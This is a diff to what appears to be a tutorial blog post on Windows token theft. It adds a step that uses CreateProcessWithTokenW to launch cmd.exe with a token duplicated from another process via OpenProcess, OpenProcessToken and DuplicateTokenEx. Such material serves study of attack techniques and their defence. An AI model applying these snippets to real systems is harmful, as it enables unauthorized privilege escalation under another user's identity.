@@ -40,14 +40,19 @@ OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, PID);
 OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken);
 ImpersonateLoggedOnUser(hToken);
 ```
-\
 
-Now for the main, most intereseting part, we will use `DuplicateTokenEx` to, as the name suggests, duplcate the token of the target process and store it: 
+
+Now for the most intereseting part, we will use `DuplicateTokenEx` to, as the name suggests, duplcate the token of the target process and store it: 
 
 ```cpp
 DuplicateTokenEx(hToken, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY |
-    TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, 0, SecurityImpersonation, TokenPrimary, &hDupToken)
+    TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, 0, SecurityImpersonation, TokenPrimary, &hDupToken);
 ```
-\
 
-zfzefzefzefzf
+We can then use the `CreateProcessWithTokenW` (no ANSI version 👎) to spwan a process, and specify the token that it wll have when created. We wll supplu the token we duplcated earlier : 
+
+```cpp
+CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", 0, 0, 0, 0, (LPSTARTUPINFOW)&startup_info, &process_info);
+```
+
+## Showcase
